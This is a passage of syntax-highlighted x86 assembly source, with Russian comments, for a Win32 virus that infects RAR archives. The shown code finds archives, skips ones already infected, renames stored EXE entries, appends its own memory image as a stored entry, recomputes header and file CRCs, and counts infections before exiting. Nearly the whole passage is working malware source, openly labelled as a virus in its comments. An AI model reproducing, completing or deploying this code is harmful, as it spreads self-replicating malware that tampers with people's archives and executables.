        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; eax - расширение файла</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">      </span><span class="sc1">; приведем к верхнему регистру</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virext</span><span class="sc0">             </span><span class="sc1">; архив уже заражен?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_rar</span><span class="sc0">                 </span><span class="sc1">; да - найдем другой</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">runext</span><span class="sc0">             </span><span class="sc1">; это EXE-файл?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_block</span><span class="sc0">              </span><span class="sc1">; нет - будем искать...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virext</span><span class="sc0">   </span><span class="sc1">; поменяем расширение файла</span><span class="sc0">

</span><span class="sc1">; [ подсчет CRC измененного заголовка ] -------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; откуда считать CRC</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; размер заголовка</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; ecx - размер заголовка без CRC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clc_crc</span><span class="sc0">                 </span><span class="sc1">; подсчитаем CRC - вернется в ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; запишем CRC в заголовок</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; размер заголовка</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0">              </span><span class="sc1">; eax - размер заголовка с вирусом</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; длина архива с дописаным вирусом</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; ebx - длина архива "с вирусом"</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFileMV</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; eax - смещение заражаемого файла</span><span class="sc0">
                                        </span><span class="sc1">;       от начала архива</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">RarHdrOfs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; сохраним его</span><span class="sc0">

</span><span class="sc1">; [ отключим файл и закроем проекцию ] --------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFileMV</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc1">; отключим файл от процесса</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFileM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">; закроем проекцию файла</span><span class="sc0">

</span><span class="sc1">; [ опять создадим проекцию и спроецируем файл ] ----------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; имя проекции (не требуется)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; low-часть  размера</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; high-часть/  0 - текущий размер</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">          </span><span class="sc1">; можно считывать и записывать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; установка защиты по умолчанию</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; описатель файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc1">; создадим проекцию файла</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; обломили?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Close_hFile</span><span class="sc0">             </span><span class="sc1">; да - закроем файл и найдем другой</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFileM</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; проецировать весь файл</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; low-part -, смещения с которого</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; high-part/  начинать проецировать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">          </span><span class="sc1">; можно считывать и записывать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; описатель проекции файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc1">; проецируем</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; обломили?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Close_hFileM</span><span class="sc0">            </span><span class="sc1">; да - закроем описатель проекции...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFileMV</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">; [ перепишем заголовок и тело вируса в конец архива ] ----------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; edi - куда писать заголовок</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarHdrOfs</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ebx - ofs заголовка</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ecx - размер заголовка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; откуда писать</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; ebx - ofs переписанного заголовка</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; переписываем заголовок</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; запомним ofs после заголовка</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; esi - начало файла вируса в памяти</span><span class="sc0">

</span><span class="sc1">; [ НЕуниверсальный способ создания дампа - только для этого вируса ] -------</span><span class="sc0">

</span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc5">len</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">-</span><span class="sc5">len</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc2">600h</span><span class="sc0">
        </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc2">800h</span><span class="sc0">
        </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc14">movd</span><span class="sc0">    </span><span class="sc2">200h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1A00h</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc1">; [ формирование блока с вирусом в rar'е ] ----------------------------------</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; esi - начало dump'а вируса в rar'е</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0">              </span><span class="sc1">; ecx - размер ^^^^^^^^^^^^^^^^^^^^^</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.pack_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc1">; поменяем размер в заголовке</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.unp_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc1">; поменяем метод на store</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clc_crc</span><span class="sc0">                 </span><span class="sc1">; подсчитаем CRC файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.file_crc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; запишем CRC файла в заголовок</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.file_name</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebp - ofs имени файла</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.name_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; eax - длинна имени</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; ebp - ofs после имени файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">runext</span><span class="sc0">   </span><span class="sc1">; поменяем расширение файла</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; откуда считать CRC</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; размер заголовка</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; ecx - размер заголовка без CRC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clc_crc</span><span class="sc0">                 </span><span class="sc1">; подсчитаем CRC - вернется в ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; запишем CRC в заголовок</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InfCount</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; увеличили счетчик заражений</span><span class="sc0">

</span><span class="sc1">; [ отключим файл данных от адресного пространства процесса ] ---------------</span><span class="sc0">
</span><span class="sc5">bad_rar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFileMV</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc1">; [ закроем проекцию файла ] ------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Close_hFileM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFileM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc1">; [ закроем файл ] ----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Close_hFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc1">; [ найдем следующий файл ] -------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InfCount</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">maxinfc</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">EndFind</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFindFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckRar</span><span class="sc0">

</span><span class="sc1">; [ закроем описатель поиска ] ----------------------------------------------</span><span class="sc0">
</span><span class="sc5">EndFind</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hFindFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindClose</span><span class="sc0">

</span><span class="sc1">; [ завершаем работу вируса ] -----------------------------------------------</span><span class="sc0">
</span><span class="sc5">Exit_Process</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">; завершаемся</span><span class="sc0">

</span><span class="sc1">; [ подсчет CRC региона, начиная с esi, размером ecx ] ----------------------</span><span class="sc0">
</span><span class="sc5">clc_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CRC_Table</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; edi - начало CRC_Table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ebp - длинна региона</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
</span><span class="sc5">c_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">c_loop</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
